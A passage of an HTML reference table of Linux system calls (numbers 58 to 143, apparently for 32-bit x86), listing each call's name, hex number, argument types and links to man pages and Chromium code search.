pgid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">58</td><td>ulimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ulimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ulimit">cs/</a></td><td align="center">0x3a</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">59</td><td>oldolduname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/oldolduname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*oldolduname">cs/</a></td><td align="center">0x3b</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">60</td><td>umask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/umask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umask">cs/</a></td><td align="center">0x3c</td><td>int mask</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">61</td><td>chroot</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chroot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chroot">cs/</a></td><td align="center">0x3d</td><td>const char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">62</td><td>ustat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ustat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ustat">cs/</a></td><td align="center">0x3e</td><td>unsigned dev</td><td>struct ustat *ubuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">63</td><td>dup2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup2">cs/</a></td><td align="center">0x3f</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">64</td><td>getppid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getppid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getppid">cs/</a></td><td align="center">0x40</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">65</td><td>getpgrp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpgrp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpgrp">cs/</a></td><td align="center">0x41</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">66</td><td>setsid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsid">cs/</a></td><td align="center">0x42</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">67</td><td>sigaction</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigaction.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigaction">cs/</a></td><td align="center">0x43</td><td>int</td><td>const struct old_sigaction *</td><td>struct old_sigaction *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">68</td><td>sgetmask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sgetmask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sgetmask">cs/</a></td><td align="center">0x44</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">69</td><td>ssetmask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ssetmask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ssetmask">cs/</a></td><td align="center">0x45</td><td>int newmask</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">70</td><td>setreuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setreuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setreuid">cs/</a></td><td align="center">0x46</td><td>uid_t ruid</td><td>uid_t euid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">71</td><td>setregid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setregid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setregid">cs/</a></td><td align="center">0x47</td><td>gid_t rgid</td><td>gid_t egid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">72</td><td>sigsuspend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigsuspend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigsuspend">cs/</a></td><td align="center">0x48</td><td>int unused1</td><td>int unused2</td><td>old_sigset_t mask</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">73</td><td>sigpending</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigpending.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigpending">cs/</a></td><td align="center">0x49</td><td>old_sigset_t *uset</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">74</td><td>sethostname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sethostname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sethostname">cs/</a></td><td align="center">0x4a</td><td>char *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">75</td><td>setrlimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setrlimit">cs/</a></td><td align="center">0x4b</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">76</td><td>getrlimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrlimit">cs/</a></td><td align="center">0x4c</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">77</td><td>getrusage</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrusage.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrusage">cs/</a></td><td align="center">0x4d</td><td>int who</td><td>struct rusage *ru</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">78</td><td>gettimeofday</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/gettimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettimeofday">cs/</a></td><td align="center">0x4e</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">79</td><td>settimeofday</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/settimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*settimeofday">cs/</a></td><td align="center">0x4f</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">80</td><td>getgroups</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgroups">cs/</a></td><td align="center">0x50</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">81</td><td>setgroups</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgroups">cs/</a></td><td align="center">0x51</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">82</td><td>select</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/select.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*select">cs/</a></td><td align="center">0x52</td><td>int n</td><td>fd_set *inp</td><td>fd_set *outp</td><td>fd_set *exp</td><td>struct timeval *tvp</td><td>-</td></tr><tr><td align="center">83</td><td>symlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/symlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*symlink">cs/</a></td><td align="center">0x53</td><td>const char *old</td><td>const char *new</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">84</td><td>oldlstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/oldlstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*oldlstat">cs/</a></td><td align="center">0x54</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">85</td><td>readlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readlink">cs/</a></td><td align="center">0x55</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">86</td><td>uselib</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/uselib.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*uselib">cs/</a></td><td align="center">0x56</td><td>const char *library</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">87</td><td>swapon</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/swapon.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapon">cs/</a></td><td align="center">0x57</td><td>const char *specialfile</td><td>int swap_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">88</td><td>reboot</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/reboot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*reboot">cs/</a></td><td align="center">0x58</td><td>int magic1</td><td>int magic2</td><td>unsigned int cmd</td><td>void *arg</td><td>-</td><td>-</td></tr><tr><td align="center">89</td><td>readdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readdir">cs/</a></td><td align="center">0x59</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">90</td><td>mmap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mmap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mmap">cs/</a></td><td align="center">0x5a</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">91</td><td>munmap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munmap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munmap">cs/</a></td><td align="center">0x5b</td><td>unsigned long addr</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">92</td><td>truncate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/truncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*truncate">cs/</a></td><td align="center">0x5c</td><td>const char *path</td><td>long length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">93</td><td>ftruncate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ftruncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ftruncate">cs/</a></td><td align="center">0x5d</td><td>unsigned int fd</td><td>unsigned long length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">94</td><td>fchmod</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmod">cs/</a></td><td align="center">0x5e</td><td>unsigned int fd</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">95</td><td>fchown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchown">cs/</a></td><td align="center">0x5f</td><td>unsigned int fd</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">96</td><td>getpriority</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpriority">cs/</a></td><td align="center">0x60</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">97</td><td>setpriority</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpriority">cs/</a></td><td align="center">0x61</td><td>int which</td><td>int who</td><td>int niceval</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">98</td><td>profil</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/profil.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*profil">cs/</a></td><td align="center">0x62</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">99</td><td>statfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statfs">cs/</a></td><td align="center">0x63</td><td>const char * path</td><td>struct statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">100</td><td>fstatfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatfs">cs/</a></td><td align="center">0x64</td><td>unsigned int fd</td><td>struct statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">101</td><td>ioperm</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioperm.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioperm">cs/</a></td><td align="center">0x65</td><td>unsigned long from</td><td>unsigned long num</td><td>int on</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">102</td><td>socketcall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/socketcall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socketcall">cs/</a></td><td align="center">0x66</td><td>int call</td><td>unsigned long *args</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">103</td><td>syslog</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/syslog.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syslog">cs/</a></td><td align="center">0x67</td><td>int type</td><td>char *buf</td><td>int len</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">104</td><td>setitimer</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setitimer">cs/</a></td><td align="center">0x68</td><td>int which</td><td>struct itimerval *value</td><td>struct itimerval *ovalue</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">105</td><td>getitimer</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getitimer">cs/</a></td><td align="center">0x69</td><td>int which</td><td>struct itimerval *value</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">106</td><td>stat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/stat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*stat">cs/</a></td><td align="center">0x6a</td><td>const char *filename</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">107</td><td>lstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lstat">cs/</a></td><td align="center">0x6b</td><td>const char *filename</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">108</td><td>fstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstat">cs/</a></td><td align="center">0x6c</td><td>unsigned int fd</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">109</td><td>olduname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/olduname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*olduname">cs/</a></td><td align="center">0x6d</td><td>struct oldold_utsname *</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">110</td><td>iopl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/iopl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*iopl">cs/</a></td><td align="center">0x6e</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">111</td><td>vhangup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vhangup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vhangup">cs/</a></td><td align="center">0x6f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">112</td><td>idle</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/idle.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*idle">cs/</a></td><td align="center">0x70</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">113</td><td>vm86old</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vm86old.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vm86old">cs/</a></td><td align="center">0x71</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">114</td><td>wait4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/wait4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*wait4">cs/</a></td><td align="center">0x72</td><td>pid_t pid</td><td>int *stat_addr</td><td>int options</td><td>struct rusage *ru</td><td>-</td><td>-</td></tr><tr><td align="center">115</td><td>swapoff</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/swapoff.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapoff">cs/</a></td><td align="center">0x73</td><td>const char *specialfile</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">116</td><td>sysinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sysinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sysinfo">cs/</a></td><td align="center">0x74</td><td>struct sysinfo *info</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">117</td><td>ipc</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ipc.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ipc">cs/</a></td><td align="center">0x75</td><td>unsigned int call</td><td>int first</td><td>unsigned long second</td><td>unsigned long third</td><td>void *ptr</td><td>long fifth</td></tr><tr><td align="center">118</td><td>fsync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fsync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsync">cs/</a></td><td align="center">0x76</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">119</td><td>sigreturn</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigreturn.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigreturn">cs/</a></td><td align="center">0x77</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">120</td><td>clone</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clone.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clone">cs/</a></td><td align="center">0x78</td><td>unsigned long</td><td>unsigned long</td><td>int *</td><td>int *</td><td>unsigned long</td><td>-</td></tr><tr><td align="center">121</td><td>setdomainname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setdomainname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setdomainname">cs/</a></td><td align="center">0x79</td><td>char *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">122</td><td>uname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/uname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*uname">cs/</a></td><td align="center">0x7a</td><td>struct old_utsname *</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">123</td><td>modify_ldt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/modify_ldt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*modify_ldt">cs/</a></td><td align="center">0x7b</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">124</td><td>adjtimex</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/adjtimex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*adjtimex">cs/</a></td><td align="center">0x7c</td><td>struct __kernel_timex *txc_p</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">125</td><td>mprotect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mprotect">cs/</a></td><td align="center">0x7d</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">126</td><td>sigprocmask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigprocmask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigprocmask">cs/</a></td><td align="center">0x7e</td><td>int how</td><td>old_sigset_t *set</td><td>old_sigset_t *oset</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">127</td><td>create_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/create_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*create_module">cs/</a></td><td align="center">0x7f</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">128</td><td>init_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/init_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*init_module">cs/</a></td><td align="center">0x80</td><td>void *umod</td><td>unsigned long len</td><td>const char *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">129</td><td>delete_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/delete_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*delete_module">cs/</a></td><td align="center">0x81</td><td>const char *name_user</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">130</td><td>get_kernel_syms</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_kernel_syms.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_kernel_syms">cs/</a></td><td align="center">0x82</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">131</td><td>quotactl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/quotactl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*quotactl">cs/</a></td><td align="center">0x83</td><td>unsigned int cmd</td><td>const char *special</td><td>qid_t id</td><td>void *addr</td><td>-</td><td>-</td></tr><tr><td align="center">132</td><td>getpgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpgid">cs/</a></td><td align="center">0x84</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">133</td><td>fchdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchdir">cs/</a></td><td align="center">0x85</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">134</td><td>bdflush</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bdflush.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bdflush">cs/</a></td><td align="center">0x86</td><td>int func</td><td>long data</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">135</td><td>sysfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sysfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sysfs">cs/</a></td><td align="center">0x87</td><td>int option</td><td>unsigned long arg1</td><td>unsigned long arg2</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">136</td><td>personality</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/personality.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*personality">cs/</a></td><td align="center">0x88</td><td>unsigned int personality</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">137</td><td>afs_syscall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/afs_syscall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*afs_syscall">cs/</a></td><td align="center">0x89</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">138</td><td>setfsuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsuid">cs/</a></td><td align="center">0x8a</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">139</td><td>setfsgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsgid">cs/</a></td><td align="center">0x8b</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">140</td><td>_llseek</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/_llseek.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*_llseek">cs/</a></td><td align="center">0x8c</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">141</td><td>getdents</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getdents.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getdents">cs/</a></td><td align="center">0x8d</td><td>unsigned int fd</td><td>struct linux_dirent *dirent</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">142</td><td>_newselect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/_newselect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*_newselect">cs/</a></td><td align="center">0x8e</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">143</td><td>flock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/flock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flock">cs/</a></td><td align="center">0x8f</td><td>unsigned int fd</td><td>unsigned int 